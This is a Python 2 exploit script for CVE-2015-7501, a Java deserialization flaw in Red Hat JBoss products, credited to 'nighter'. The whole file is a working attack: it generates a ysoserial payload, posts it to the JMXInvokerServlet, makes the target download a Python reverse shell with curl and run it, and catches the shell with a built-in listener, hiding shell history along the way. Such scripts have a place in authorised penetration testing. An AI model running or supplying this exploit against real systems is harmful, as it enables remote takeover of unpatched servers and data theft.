#!/usr/bin/env python2
#-*- coding: utf-8 -*- #########################################################################################
#▐▄▄▄▄▄▄▄·       .▄▄ · .▄▄ · ·▄▄▄▄  ▄▄▄ ..▄▄ · ▄▄▄ .▄▄▄  ▄▄▄   ▄▄· ▄▄▄ .                                       #
#·██▐█ ▀█▪▪     ▐█ ▀. ▐█ ▀. ██▪ ██ ▀▄.▀·▐█ ▀. ▀▄.▀·▀▄ █·▀▄ █·▐█ ▌▪▀▄.▀·                                        #
#▪▄ ██▐█▀▀█▄ ▄█▀▄ ▄▀▀▀█▄▄▀▀▀█▄▐█· ▐█▌▐▀▀▪▄▄▀▀▀█▄▐▀▀▪▄▐▀▀▄ ▐▀▀▄ ██ ▄▄▐▀▀▪▄                                      #
#▐▌▐█▌██▄▪▐█▐█▌.▐▌▐█▄▪▐█▐█▄▪▐███. ██ ▐█▄▄▌▐█▄▪▐█▐█▄▄▌▐█•█▌▐█•█▌▐███▌▐█▄▄▌                                      #
#▀▀▀•·▀▀▀▀  ▀█▄▀▪ ▀▀▀▀  ▀▀▀▀ ▀▀▀▀▀•  ▀▀▀  ▀▀▀▀  ▀▀▀ .▀  ▀.▀  ▀·▀▀▀  ▀▀▀                                        #
# jboss6_deser_rce - nighter                                                                                   #
#                                                                                                              #
# DATE                                                                                                         #
# 05/10/2018                                                                                                   #
#                                                                                                              #
# DESCRIPTION                                                                                                  #
#                                                                                                              #
# CVE-2015-7501 - Red Hat JBoss A-MQ 6.x; BPM Suite (BPMS) 6.x; BRMS 6.x and 5.x; Data Grid (JDG) 6.x;         #
# Data Virtualization (JDV) 6.x and 5.x; Enterprise Application Platform 6.x, 5.x, and 4.3.x;                  #
# Fuse 6.x; Fuse Service Works (FSW) 6.x; Operations Network (JBoss ON) 3.x; Portal 6.x;                       #
# SOA Platform (SOA-P) 5.x; Web Server (JWS) 3.x; Red Hat OpenShift/xPAAS 3.x; and                             #
# Red Hat Subscription Asset Manager 1.3 allow remote attackers to execute arbitrary commands via a crafted    #
#                                                                                                              #
# nighter - http://nighter.se/                                                                                 #
#                                                                                                              #
################################################################################################################

import requests
import commands
import SimpleHTTPServer
import SocketServer
import termios
import select
import socket
import random
import os
import fcntl
import sys
import time
import signal

from multiprocessing import Process


# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print("\nYou pressed Ctrl+C!")
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)

class PTY:
    def __init__(self, slave=0, pid=os.getpid()):
        # apparently python GC's modules before class instances so, here
        # we have some hax to ensure we can restore the terminal state.
        self.termios, self.fcntl = termios, fcntl

        # open our controlling PTY
        self.pty = open(os.readlink("/proc/%d/fd/%d" % (pid, slave)), "rb+")

        # store our old termios settings so we can restore after
        # we are finished
        self.oldtermios = termios.tcgetattr(self.pty)

        # get the current settings se we can modify them
        newattr = termios.tcgetattr(self.pty)

        # set the terminal to uncanonical mode and turn off
        # input echo.
        newattr[3] &= ~termios.ICANON & ~termios.ECHO

        # don't handle ^C / ^Z / ^\
        newattr[6][termios.VINTR] = '\x00'
        newattr[6][termios.VQUIT] = '\x00'
        newattr[6][termios.VSUSP] = '\x00'

        # set our new attributes
        termios.tcsetattr(self.pty, termios.TCSADRAIN, newattr)

        # store the old fcntl flags
        self.oldflags = fcntl.fcntl(self.pty, fcntl.F_GETFL)
        # fcntl.fcntl(self.pty, fcntl.F_SETFD, fcntl.FD_CLOEXEC)
        # make the PTY non-blocking
        fcntl.fcntl(self.pty, fcntl.F_SETFL, self.oldflags | os.O_NONBLOCK)

    def read(self, size=8192):
        return self.pty.read(size)

    def write(self, data):
        ret = self.pty.write(data)
        self.pty.flush()
        return ret

    def fileno(self):
        return self.pty.fileno()

    def __del__(self):
        # restore the terminal settings on deletion
        self.termios.tcsetattr(self.pty, self.termios.TCSAFLUSH, self.oldtermios)
        self.fcntl.fcntl(self.pty, self.fcntl.F_SETFL, self.oldflags)


class Shell:
    def __init__(self, addr, bind=True):
        self.bind = bind
        self.addr = addr

        if self.bind:
            self.sock = socket.socket()
            self.sock.bind(self.addr)
            self.sock.listen(5)

    def handle(self, addr=None):
        addr = addr or self.addr
        if self.bind:
            sock, addr = self.sock.accept()
        else:
            sock = socket.socket()
            sock.connect(addr)

        # create our PTY
        pty = PTY()

        # input buffers for the fd's
        buffers = [[sock, []], [pty, []]]

        def buffer_index(fd):
            for index, buffer in enumerate(buffers):
                if buffer[0] == fd:
                    return index

        readable_fds = [sock, pty]

        data = " "
        # keep going until something deds
        while data:
            # if any of the fd's need to be written to, add them to the
            # writable_fds
            writable_fds = []
            for buffer in buffers:
                if buffer[1]:
                    writable_fds.append(buffer[0])

            r, w, x = select.select(readable_fds, writable_fds, [])

            # read from the fd's and store their input in the other fd's buffer
            for fd in r:
                buffer = buffers[buffer_index(fd) ^ 1][1]
                if hasattr(fd, "read"):
                    data = fd.read(8192)
                else:
                    data = fd.recv(8192)
                if data:
                    buffer.append(data)

            # send data from each buffer onto the proper FD
            for fd in w:
                buffer = buffers[buffer_index(fd)][1]
                data = buffer[0]
                if hasattr(fd, "write"):
                    fd.write(data)
                else:
                    fd.send(data)
                buffer.remove(data)

        # close the socket
        sock.close()


def HttpListener():

    os.chdir('/tmp')
    HTTP_PORT = 8000
    Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
    httpd = SocketServer.TCPServer(("", HTTP_PORT), Handler)
    print "[+] HTTP Listen =", HTTP_PORT
    httpd.serve_forever()


def BuildPythonReverseShell():

    python_rev_shell = '''#!/usr/bin/env python
import os
import pty
import socket

lhost = "%s"
lport = %s

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, lport))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    os.putenv("HISTFILE",'/dev/null')
    pty.spawn("/bin/bash")
    s.close()

if __name__ == "__main__":
    main()
''' % (LHOST, LPORT)

    print "[+] Prepare payload"
    with open('/tmp/%s' % FILENAME, 'w') as payload:
        payload.write(python_rev_shell)


def rce(COMMAND = ''):

    payload = commands.getoutput("java -jar ./ysoserial.jar CommonsCollections7 \"%s\"" % COMMAND)

    _url = '%s/invoker/JMXInvokerServlet' % URL

    try:
        r = requests.post(url=_url, data=payload)

        print("[+] Exploit")
    except:
        print("[-] Exploit failed.")


def exploit():

    time.sleep(3)
    rce('curl http://%s:8000/%s -o /tmp/%s' % (LHOST, FILENAME, FILENAME))
    rce('python /tmp/%s' % FILENAME)


if __name__ == '__main__':

    if len(sys.argv) != 4:
        print ("""
 ▐▄▄▄▄▄▄▄·       .▄▄ · .▄▄ · ·▄▄▄▄  ▄▄▄ ..▄▄ · ▄▄▄ .▄▄▄  ▄▄▄   ▄▄· ▄▄▄ .
  ·██▐█ ▀█▪▪     ▐█ ▀. ▐█ ▀. ██▪ ██ ▀▄.▀·▐█ ▀. ▀▄.▀·▀▄ █·▀▄ █·▐█ ▌▪▀▄.▀·
▪▄ ██▐█▀▀█▄ ▄█▀▄ ▄▀▀▀█▄▄▀▀▀█▄▐█· ▐█▌▐▀▀▪▄▄▀▀▀█▄▐▀▀▪▄▐▀▀▄ ▐▀▀▄ ██ ▄▄▐▀▀▪▄
▐▌▐█▌██▄▪▐█▐█▌.▐▌▐█▄▪▐█▐█▄▪▐███. ██ ▐█▄▄▌▐█▄▪▐█▐█▄▄▌▐█•█▌▐█•█▌▐███▌▐█▄▄▌
 ▀▀▀•·▀▀▀▀  ▀█▄▀▪ ▀▀▀▀  ▀▀▀▀ ▀▀▀▀▀•  ▀▀▀  ▀▀▀▀  ▀▀▀ .▀  ▀.▀  ▀·▀▀▀  ▀▀▀ 
[nighter@nighter.se]
    """)
        print("Usage: %s <URL> <LHOST> <LPORT>" % (sys.argv[0]))
        print("EXAMPLE: ./jboss6_deser_rce.py 'http://127.0.0.1:8080' 192.168.1.81 1337\n")
        sys.exit(0)

    URL = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    print("[+] LHOST = %s" % LHOST)

    # Generate random number as filename
    FILENAME = str(random.random())[-1]

    BuildPythonReverseShell()

    # Start http listener
    p = Process(target=HttpListener)
    p.start()

    # Run ldap server async
    p = Process(target=exploit)
    p.start()

    # Start listener
    print "[+] Shell listen"
    s = Shell((LHOST, int(LPORT)), bind=True)
    s.handle()
